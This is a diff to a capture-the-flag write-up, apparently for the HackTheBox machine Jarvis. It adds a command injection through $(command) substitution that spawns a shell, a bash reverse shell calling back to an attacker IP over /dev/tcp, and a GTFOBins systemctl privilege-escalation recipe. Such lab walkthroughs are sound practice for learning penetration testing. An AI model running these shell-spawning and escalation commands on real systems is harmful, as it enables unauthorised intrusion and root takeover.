@@ -238,6 +238,11 @@ DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
 
 
 
+## Gaining Access: Method 2
++ 
+
+
+
 ### Shell Upgrade
 + We have partially interactive bash shell. Upgrade it to get a fully interactive shell, do more stable with a better shell.
 ```
@@ -273,6 +278,7 @@ stty rows 55 columns 285
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/73259250-7d4f-4c37-81bc-59119c98d5ef)
 
 + There's a clear command injection in the exec_ping code where the input is read to **command**.
++ **$(command)** can be used as a bash substitution, and hence the weak sanitization can be bypassed.
 + Notice that the dollar sign is allowed, and run the command:
 ```
 sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
@@ -284,6 +290,14 @@ Enter an IP: $(/bin/bash)
 + Get the pepper's shell, and read the user flag.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/cd05cba2-ac58-4f92-9642-2d2ee150e7ca)
+
++ **Alternatively**, start a netcat listener on the attack machine, and enter a reverse shell on the obtained shell of the target since the shell isn't good (doesn't give any output for commands).
+```
+nc -lnvp 6666
+bash -i >& /dev/tcp/10.10.14.8/6666 0>&1
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/19955743-7ff3-4486-b6f5-8b95fbdb8c33)
 
 
 
@@ -299,13 +313,15 @@ find / -type f -user root -perm /4000 -exec ls -l {} \; 2>/dev/null
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6f364d98-6e5e-463b-baf9-ce9b9af6953f)
 
 + Since the file is owned by root, the file will execute with root privileges.
-+ Check [systemctl](https://gtfobins.github.io/gtfobins/systemctl/) on gtfobins.
++ Check [systemctl](https://gtfobins.github.io/gtfobins/systemctl/) with [sudo](https://gtfobins.github.io/gtfobins/systemctl/#sudo) on gtfobins.
 ```
 TF=$(mktemp)
 echo /bin/sh >$TF
 chmod +x $TF
 SYSTEMD_EDITOR=$TF systemctl edit system.slice
 ```
+
++ Get the root shell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0aa23315-8d23-4e11-8f29-d8fc2c2a89b2)
 
@@ -336,6 +352,7 @@ WantedBy=multi-user.target
 
 + Start a netcat listener on the attack machine: `nc -lnvp 5555`
 + In the target machine, start the **shell** service: `/bin/systemctl start shell`
++ Get the root shell.
 
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1e77d5f4-ba24-4fa3-a075-d274510fdb03)
 
@@ -351,6 +368,8 @@ WantedBy=multi-user.target
 
 # References & Alternatives
 + https://vvmlist.github.io/#jarvis
++ https://shreyapohekar.com/blogs/jarvis-hackthebox-walkthrough/
++ 
 + https://ivanitlearning.wordpress.com/2020/10/14/hackthebox-jarvis/
 + https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/jarvis-writeup-w-o-metasploit
 + https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
